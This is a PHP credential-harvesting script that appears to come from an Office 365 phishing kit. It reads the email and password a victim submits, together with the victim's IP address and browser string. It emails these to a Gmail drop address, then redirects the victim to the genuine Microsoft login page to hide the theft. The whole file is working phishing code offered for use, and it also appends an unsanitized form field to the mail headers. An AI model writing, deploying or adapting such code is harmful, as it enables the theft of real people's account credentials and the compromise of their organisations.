<?
$ip = getenv("REMOTE_ADDR");
session_start();
$email = $_POST['email'];
$passwd = $_POST['passwd'];
$datamasii=date("D M d, Y g:i a");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------Spam ReSulT--------------------\n
Email ID : $email
Passwdord: $passwd
-------------------------------------------------------------\n
Date     : $datamasii
Browser  : $browser
IP       : $ip
-----------------Spam ReSulT-----------------------------------\n";
$send = "crisonlinelogs@gmail.com";
$subject = "office Log";
$headers = "From: ReZult<logzz@cok.edu>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send",$subject,$message,$headers);
?>
<script>
    window.top.location.href = "https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3d1d7fIHbS39W1dylPNH-JCBAPmQXKz8TsNsIosZ8cpKLD-bU5TRvDUMq3zvVBqUK3ZV10v0Nc9C4TOd93cGJo6b5hNZIFKmsx77MCYoeV3wyEeVTFV4uyM2F0Keww76TX&nonce=636516900962501689.NjI2ZDFmZjQtOWFmYy00ZTc2LThlYTAtZDE5NTMwMWFlZjVkNmJjMmFlZDgtMDQ3OS00ZWQzLWJhZDctNjZlZGE3OGM5MDkw&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-ZA&mkt=en-ZA?cmd=login_submit&id=$praga$praga&session=$praga$praga";

</script>
